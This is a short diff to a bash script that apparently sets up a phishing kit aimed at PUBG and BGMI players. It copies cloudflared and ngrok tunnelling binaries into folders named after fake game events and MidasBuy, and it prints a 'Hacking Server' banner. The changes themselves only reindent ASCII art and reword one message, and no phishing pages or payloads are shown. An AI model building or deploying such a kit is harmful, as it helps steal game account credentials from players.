@@ -17,16 +17,16 @@ echo -e "\e[33m
 ░░        ░░░ ░ ░  ░    ░ ░ ░   ░ 
             ░      ░            ░ 
                         ░         
- ▄▄▄▄     ▄████  ███▄ ▄███▓ ██▓   
-▓█████▄  ██▒ ▀█▒▓██▒▀█▀ ██▒▓██▒   
-▒██▒ ▄██▒██░▄▄▄░▓██    ▓██░▒██▒   
-▒██░█▀  ░▓█  ██▓▒██    ▒██ ░██░   
-░▓█  ▀█▓░▒▓███▀▒▒██▒   ░██▒░██░   
-░▒▓███▀▒ ░▒   ▒ ░ ▒░   ░  ░░▓     
-▒░▒   ░   ░   ░ ░  ░      ░ ▒ ░   
- ░    ░ ░ ░   ░ ░      ░    ▒ ░   
- ░            ░        ░    ░     
-      ░                           
+         ▄▄▄▄     ▄████  ███▄ ▄███▓ ██▓   
+        ▓█████▄  ██▒ ▀█▒▓██▒▀█▀ ██▒▓██▒   
+        ▒██▒ ▄██▒██░▄▄▄░▓██    ▓██░▒██▒   
+        ▒██░█▀  ░▓█  ██▓▒██    ▒██ ░██░   
+        ░▓█  ▀█▓░▒▓███▀▒▒██▒   ░██▒░██░   
+        ░▒▓███▀▒ ░▒   ▒ ░ ▒░   ░  ░░▓     
+        ▒░▒   ░   ░   ░ ░  ░      ░ ▒ ░   
+         ░    ░ ░ ░   ░ ░      ░    ▒ ░   
+         ░            ░        ░    ░     
+              ░                           
   \e[0m\n"
 }
 
@@ -238,7 +238,6 @@ cp -R cloudflared-linux-arm64 ngrok .SUMAN/Avalanche-X-Suit-LuckySpin/
 cp -R cloudflared-linux-arm64 ngrok .SUMAN/MidasBuy/
 cp -R cloudflared-linux-arm64 ngrok .SUMAN/SPIN-EVENT/
 cp -R cloudflared-linux-arm64 ngrok .SUMAN/RP-Month-6-event/
-
 cp -R cloudflared-linux-arm64 ngrok .SUMAN/BGMI_4_Anniversarry/
 cp -R cloudflared-linux-arm64 ngrok .SUMAN/PUBG-4-Anniversarry/
 cp -R cloudflared-linux-arm64 ngrok .SUMAN/PUBG-RP-M9/
@@ -260,7 +259,7 @@ echo
 echo
 logo
 echo
-echo -e "\e[35m[+] Connect Online Hacking PUBG BGMI Hacking Server......  \e[m "
+echo -e "\e[35m[+] Connect Online Hacking PUBG BGMI Hacking Server (CyberPlane)......  \e[m "
 sleep 7
 echo
 echo
